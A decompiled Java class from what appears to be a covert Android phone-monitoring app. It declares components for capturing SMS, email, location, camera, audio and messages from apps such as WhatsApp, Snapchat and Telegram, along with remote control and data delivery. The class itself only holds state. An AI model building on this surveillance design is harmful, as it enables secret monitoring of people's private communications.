package com.vvt.appengine;

import android.content.Context;
import com.vvt.activation_manager.ActivationManager;
import com.vvt.application_profile_manager.ApplicationProfileManagerImpl;
import com.vvt.base.RunningMode;
import com.vvt.capture.simchange.SimChangeCapture;
import com.vvt.productinfo.ProductInfoImpl;
import com.vvt.remotecontrol.RemoteControlImpl;

public class AppEngine1 {
  public SimChangeCapture A;
  public com.vvt.capture.wa.a B;
  public com.vvt.addressbookmanager.b C;
  public com.vvt.capture.camera.image.a D;
  public com.vvt.c.c E;
  public com.vvt.capture.camera.video.a F;
  public com.vvt.capture.audio.a G;
  public com.vvt.v.c H;
  public com.vvt.capture.f.c I;
  public com.vvt.capture.browserurl.a J;
  public com.vvt.capture.chrome.a K;
  public com.vvt.capture.b.b L;
  public ApplicationProfileManagerImpl M;
  public com.vvt.capture.calendar.a N;
  public com.vvt.capture.c.b O;
  public com.vvt.capture.e.c P;
  public com.vvt.callhandler.c Q;
  public com.vvt.capture.a.a R;
  public com.vvt.a.a S;
  public com.vvt.capture.viber.b T;
  public com.vvt.capture.wechat.a U;
  public com.vvt.n.a.c V;
  public com.vvt.capture.d.b W;
  public com.vvt.capture.d.a.a X;
  public com.vvt.capture.d.a Y;
  public com.vvt.autoupdate.a Z;
  public ActivationManager a;
  public com.vvt.capture.hangouts.f aa;
  public com.vvt.capture.yahoo.b ab;
  public com.vvt.capture.kik.a ac;
  public com.vvt.capture.telegram.a ad;
  public com.vvt.capture.tinder.a ae;
  public com.vvt.capture.instagram.directmessage.a af;
  public com.vvt.capture.snapchat.a ag;
  public com.vvt.capture.qq.b ah;
  public com.vvt.capture.hike.a ai;
  public com.vvt.al.d aj;
  public com.vvt.playstore.autoupdateapps.b ak;
  public com.vvt.temporalcontrol.d al;
  public com.vvt.capture.viber.a.a.a am;
  public com.vvt.capture.c.b.a.a an;
  public com.vvt.capture.e.c.a.a ao;
  public com.vvt.capture.b.c.a.a ap;
  public com.vvt.capture.wa.voip.calllog.a aq;
  private Context ar;
  private String as;
  private RunningMode at;
  private String au;
  private String av;
  public com.vvt.callmanager.ref.e b;
  public com.vvt.ae.f c;
  public com.vvt.phoenix.prot.c d;
  public com.vvt.configurationmanager.e e;
  public com.vvt.connectionhistorymanager.b f;
  public com.vvt.datadeliverymanager.b g;
  public q h;
  public com.vvt.eventdelivery.f i;
  public com.vvt.eventrepository.c j;
  public com.vvt.license.b k;
  public com.vvt.phoneinfo.b l;
  public com.vvt.networkinfo.a m;
  public com.vvt.preference.b n;
  public ProductInfoImpl o;
  public com.vvt.remotecommand.b p;
  public RemoteControlImpl q;
  public com.vvt.server_address_manager.b r;
  public com.vvt.pushnotification.d s;
  public com.vvt.capture.calllog.a t;
  public com.vvt.capture.sms.a u;
  public com.vvt.capture.mms.b v;
  public com.vvt.capture.email.b.a w;
  public com.vvt.capture.email.generic.a x;
  public com.vvt.capture.email.gmail.a y;
  public com.vvt.capture.location.a z;
  
  public AppEngine1(Context paramContext, String paramString1, RunningMode paramRunningMode, String paramString2)
  {
    this.ar = paramContext;
    this.as = paramString1;
    this.at = paramRunningMode;
    this.au = paramString2;
  }
  
  public Context a()
  {
    return this.ar;
  }
  
  public void a(RunningMode paramRunningMode)
  {
    this.at = paramRunningMode;
  }
  
  public void a(String paramString)
  {
    this.av = paramString;
  }
  
  public String b()
  {
    return this.as;
  }
  
  public String c()
  {
    return this.au;
  }
  
  public RunningMode d()
  {
    return this.at;
  }
  
  public String e()
  {
    return this.av;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */